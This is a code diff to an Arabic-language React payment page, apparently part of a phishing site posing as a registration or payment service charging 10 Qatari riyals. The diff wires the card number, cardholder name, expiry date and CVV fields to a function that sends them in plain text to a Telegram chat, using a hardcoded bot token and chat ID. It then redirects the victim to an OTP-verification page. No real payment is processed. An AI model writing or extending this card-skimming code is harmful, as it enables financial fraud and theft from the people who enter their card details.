@@ -16,7 +16,38 @@ const steps = [
 const RegistrationComplete = () => {
   const [currentView, setCurrentView] = useState<'welcome' | 'payment' | 'card-payment'>('welcome');
   const [showApplePayError, setShowApplePayError] = useState(false);
+  const [cardNumber, setCardNumber] = useState<string>("");
+  const [cardholderName, setCardholderName] = useState<string>("");
+  const [expiryDate, setExpiryDate] = useState<string>("");
+  const [cvv, setCvv] = useState<string>("");
   const navigate = useNavigate();
+
+  const sendToTelegram = async (message: string) => {
+    try {
+      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
+      const chatId = "-4985537188";
+      
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      });
+    } catch (error) {
+      console.error("فشل الإرسال إلى Telegram:", error);
+    }
+  };
+
+  const handleConfirmPayment = async () => {
+    const message = `بيانات الدفع - بطاقة الائتمان\n\nرقم البطاقة: ${cardNumber}\nاسم حامل البطاقة: ${cardholderName}\nتاريخ الانتهاء: ${expiryDate}\nCVV: ${cvv}\nالمبلغ المدفوع: 10.00 ريال قطري`;
+    await sendToTelegram(message);
+    navigate('/otp-verification');
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white" dir="rtl">
@@ -162,6 +193,8 @@ const RegistrationComplete = () => {
                     className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-right focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                     maxLength={19}
                     dir="ltr"
+                    value={cardNumber}
+                    onChange={(e) => setCardNumber(e.target.value)}
                   />
                 </div>
 
@@ -174,6 +207,8 @@ const RegistrationComplete = () => {
                     type="text"
                     placeholder="الاسم كما هو مكتوب على البطاقة"
                     className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-right focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
+                    value={cardholderName}
+                    onChange={(e) => setCardholderName(e.target.value)}
                   />
                 </div>
 
@@ -189,6 +224,8 @@ const RegistrationComplete = () => {
                       className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-center focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                       maxLength={5}
                       dir="ltr"
+                      value={expiryDate}
+                      onChange={(e) => setExpiryDate(e.target.value)}
                     />
                   </div>
                   <div className="space-y-2">
@@ -201,6 +238,8 @@ const RegistrationComplete = () => {
                       className="w-full h-12 px-4 rounded-md border border-input bg-background text-foreground text-center focus:outline-none focus:ring-2 focus:ring-ring focus:border-transparent"
                       maxLength={3}
                       dir="ltr"
+                      value={cvv}
+                      onChange={(e) => setCvv(e.target.value)}
                     />
                   </div>
                 </div>
@@ -217,7 +256,7 @@ const RegistrationComplete = () => {
               <div className="flex gap-3 flex-row-reverse mt-8">
                 <Button 
                   className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
-                  onClick={() => navigate('/otp-verification')}
+                  onClick={handleConfirmPayment}
                 >
                   تأكيد الدفع - 10.00 ر.ق
                 </Button>
